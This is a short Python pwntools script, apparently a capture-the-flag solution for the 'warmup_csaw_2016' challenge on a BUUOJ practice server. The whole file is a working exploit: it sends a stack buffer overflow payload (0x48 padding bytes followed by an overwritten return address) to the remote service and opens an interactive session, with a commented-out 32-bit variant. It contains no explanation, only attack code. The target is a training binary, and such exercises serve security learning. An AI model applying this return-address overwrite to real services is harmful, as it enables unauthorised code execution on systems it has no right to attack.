from pwn import *
context.terminal=['tmux','splitx','-h']
context.log_level='debug'

p=remote("node4.buuoj.cn",26649)
# p=process("./warmup_csaw_2016")

addrfun=0x40060D

payload=0x48*b'a'+p64(addrfun)

# payload=136*b'A'+4*b'B'+p32(0x8048320)+4*b'0'+p32(0x0804A024)
# # payload=b'233'
# p.sendafter(b'please input\n',payload)

# p.sendline(b'ls')
p.sendline(payload)
p.interactive()